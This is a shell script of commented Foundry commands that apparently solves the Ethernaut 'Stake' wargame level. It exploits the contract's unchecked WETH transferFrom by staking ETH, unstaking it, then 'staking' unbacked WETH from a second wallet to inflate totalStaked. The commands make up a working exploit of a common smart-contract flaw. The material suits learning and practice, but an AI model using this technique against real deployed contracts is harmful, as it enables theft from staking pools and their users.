source ~/ethernauts/.env
echo "RPC_URL: $RPC_URL"

# The Stake contract's ETH balance has to be greater than 0. -> done
# totalStaked must be greater than the Stake contract's ETH balance.
# You must be a staker. -> done
# Your staked balance must be 0. -> done

# contract is trash, doesn't check if transferFrom reverts.
# simply become a Staker of stake 0 then Stake WETH from another contract

# cast call \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0x145145c6e5BBF998dA481e2F589D1E196B341758 \
#     "WETH()(address)"
# -> 0x42A09C3fbfb22774936B5D5d085e2FA7963b0db8

# cast call \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0x145145c6e5BBF998dA481e2F589D1E196B341758 \
#     "totalStaked()(uint256)"
# # -> 0

# cast balance --rpc-url $RPC_URL 0x145145c6e5BBF998dA481e2F589D1E196B341758
# -> 0

# cast call \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0x145145c6e5BBF998dA481e2F589D1E196B341758 \
#     "Stakers(address)(bool)" $PRIMARY_ADDRESS
# -> false

# cast call \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0x145145c6e5BBF998dA481e2F589D1E196B341758 \
#     "UserStake(address)(uint256)" $PRIMARY_ADDRESS
# -> 0

# Lets become a staker:

# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0x145145c6e5BBF998dA481e2F589D1E196B341758 \
#     "StakeETH()()" --value 0.0011ether

# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $PRIVATE_KEY \
#     0x145145c6e5BBF998dA481e2F589D1E196B341758 \
#     "Unstake(uint256)()" 1100000000000000

# lets stake weth from secondary wallet

# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $SECONDARY_PRIVATE_KEY \
#     0x42A09C3fbfb22774936B5D5d085e2FA7963b0db8 \
#     "approve(address, uint256)()" 0x145145c6e5BBF998dA481e2F589D1E196B341758 999999999999999999999

# cast send \
#     --rpc-url $RPC_URL \
#     --private-key $SECONDARY_PRIVATE_KEY \
#     0x145145c6e5BBF998dA481e2F589D1E196B341758 \
#     "StakeWETH(uint256)(bool)" 1100000000000000
